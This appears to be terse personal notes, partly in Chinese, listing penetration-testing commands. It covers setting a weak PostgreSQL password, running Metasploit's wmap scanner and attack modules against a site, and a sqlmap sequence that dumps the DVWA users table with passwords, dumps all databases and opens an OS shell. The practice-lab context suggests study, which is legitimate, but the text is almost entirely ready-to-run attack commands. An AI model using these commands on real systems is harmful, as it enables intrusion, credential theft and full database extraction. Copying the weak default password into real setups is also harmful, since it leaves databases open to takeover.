vulns

5.postgresql
sudo -u postgres psql
ALTER USER postgres WITH PASSWORD 'postgres';

6.wmap
load wmap
wmap_sites -a http://www.dvssc.com
wmap_sites -l
wmap_targets -d 0
wmap_run -t(展示一起测试的所有模块)
wmap_run -e(开始攻击)

7.sqlmap
sqlmap -u '' --cookie='' --dbs
sqlmap -u '' --cookie='' -D dvwa --tables
sqlmap -u '' --cookie='' -D dvwa -T users --columns
sqlmap -u '' --cookie='' -D dvwa -T users -C user,password --dump
sqlmap -u '' --cookie='' --dump-all  #所有数据库所有内容
sqlmap -u '' --cookie='' --os-shell

